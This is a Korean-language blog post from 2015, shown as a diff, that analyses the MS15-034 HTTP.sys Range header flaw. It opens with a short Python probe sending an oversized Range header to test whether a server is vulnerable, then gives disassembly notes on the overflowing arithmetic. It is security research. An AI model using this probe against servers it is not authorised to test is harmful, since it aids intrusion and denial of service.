@@ -1,0 +1,63 @@
+---
+layout: post
+title: "MS15-034 HTTP.sys"
+date: 2015-04-16 16:09:37 +0900
+comments: true
+categories: 
+---
+
+``` python
+import socket
+target = 'www.babo.com'
+port = 80
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect( (target,port) )
+s.send("GET / HTTP/1.1\r\nHost: www.babo.com\r\nRange: bytes=0-18446744073709551615\r\n\r\n")
+resp = s.recv(4096)
+
+print resp
+
+if "Range Not Satisfiable" in resp:
+    print "Looks vulnerable."
+```
+
+Errata Security Blog 에 따르면, GET request 가 static contents 에 들어가야만 `Range:` 가 처리되서 버그가 trigger 된다고 한다. `.asp` 같은 동적 contents 를 호출하면 trigger 할 수 없다는 이야기.
+
+[The Delicate Art of Remote Checks - A Glance Into MS15-034](http://blog.beyondtrust.com/the-delicate-art-of-remote-checks-a-glance-into-ms15-034) 를 읽어보니,
+
+* bindiff 를 때리고
+* similarity 를 보고 패치가 들어간 함수들을 찾아서, 
+* IDA Pro 로 보니, `_UlpParseRange@32` 의 caller 는 `_UlContentRangeHeaderHandler@20`
+* `kd> bp HTTP!urlparserange "k;g"
+
+``` 
+0006ED31    _UlpParseRange@32
+
+0006EEF9    sub     eax, edi
+0006EEFB    sbb     ecx, edx
+0006EEFD    add     eax, 1
+0006EF00    adc     ecx, 0
+0006EF03    mov     ds:[esi], eax
+0006EF05    mov     ds:[esi+4], ecx
+```
+
+코드상으로 보면 `ecx:eax` 에서 `edx:edi` 를 subtract 하는 것이다. 즉 8 바이트 더하기/빼기 연산.
+하단부터 빼고, `sbb` 로 borrow 까지 쳐서 빼는 코드.
+그리고, 하단에 `+1` 을 하고, 상단에 `adc` 로 캐리까지 올려서 더해주기.
+
+`Range: A-B` 에서 `B - A + 1` 을 구현하는 코드로 보인다.
+
+``` python
+>>> 0xFFFFFFFFFFFFFFFF
+18446744073709551615L
+```
+
+여기에 `B` 값에 `0xFFFFFFFFFFFFFFFF` 이 들어가면서 문제가 벌어지는 것 같은데.
+
+테스트해보는 김에 다음을 해봐야겠다.
+
+1. Visual C++ 에서 signed/unsigned 다양하게 `B - A + 1` 을 해본다. B 는 0xFFFFFFFFFFFFFFFF 를 넣어서.
+2. 저 x86 인스트럭션을 가지고 그대로 테스트해본다.
+
+가장 좋은건 취약한 IIS 버전을 VM 에 올려서 kd 를 걸고 해보는 것인데, 나중에 해볼련다.
